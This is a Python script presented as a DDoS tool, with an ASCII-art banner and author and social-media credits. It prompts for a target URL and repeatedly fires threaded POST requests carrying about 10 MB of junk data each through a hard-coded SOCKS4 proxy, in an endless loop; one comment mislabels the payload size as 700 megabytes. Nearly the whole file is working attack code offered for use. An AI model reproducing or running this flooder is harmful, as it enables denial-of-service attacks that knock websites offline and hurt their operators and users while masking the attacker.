import requests
import random
import threading
import time
import socket 


class DDoSAttack:
    def __init__(self, target_url, packets_per_minute, packet_size):
        self.target_url = target_url
        self.packets_per_minute = packets_per_minute
        self.packet_size = packet_size
        self.proxies = self.load_proxies()

    def load_proxies(self):
        # Load proxies from a file or define them here
        return ["socks4://51.68.229.179:54055"]

    def send_packet(self, proxy):
        try:
            # Generate random data for the packet
            data = 'X' * self.packet_size
            response = requests.post(self.target_url, data=data, proxies={"http": proxy, "https": proxy})
            if response.status_code == 200:
                print(f"Packet sent successfully via {proxy}")
            else:
                print(f"Failed to send packet via {proxy}: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error sending packet via {proxy}: {e}")

    def attack(self):
        print(f"Starting attack on {self.target_url} with {self.packets_per_minute} packets per minute.")
        while True:
            threads = []
            for _ in range(self.packets_per_minute):
                proxy = random.choice(self.proxies)
                thread = threading.Thread(target=self.send_packet, args=(proxy,))
                threads.append(thread)
                thread.start()
            for thread in threads:
                thread.join()
            time.sleep(60)  # Wait for a minute before sending the next batch
print("\033[34;1m[YOUR LOGO]\033[34;1m")

print("""
 
    _______         __                    _______  __                                     
|   _   |.--.--.|  |--..-----..----.  |   _   ||  |.---.-..--.--..-----..----..-----.  
|.  1___||  |  ||  _  ||  -__||   _|  |   1___||  ||  _  ||  |  ||  -__||   _||__ --|  
|.  |___ |___  ||_____||_____||__|    |____   ||__||___._||___  ||_____||__|  |_____|  
|:  1   ||_____|                      |:  1   |           |_____|                      
|::.. . |                             |::.. . |                                        
`-------'                             `-------'                                        
                                                                                       
                                                            
       
                 
""")

print("\033[31;1mAuthor  :Joyonto Barua\033[34;1m")
print("\033[31;1mGithub  :H4CKJOY71\033[34;1m")
print("\033[31;1mPage Name. :Cyber Slayer\033[34;1m")
print("\033[31;1mFacebook profile. :https://www.facebook.com/profile.php?id=100094606141428")
print("\033[34;1mFacebook Name:Joyonto Barua\033[34;1m")

if __name__ == "__main__":
    try:
        target_url = input("Enter the target website URL: ")
        packets_per_minute = int(input("Enter the number of packets to send per minute: "))
        packet_size = 10 * 1024 * 1024  # 700 Megabytes

        attack = DDoSAttack(target_url, packets_per_minute, packet_size)
        attack.attack()
    except ValueError as e:
        print(f"Invalid input: {e}")
    except KeyboardInterrupt:
        print("Attack stopped by user.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")



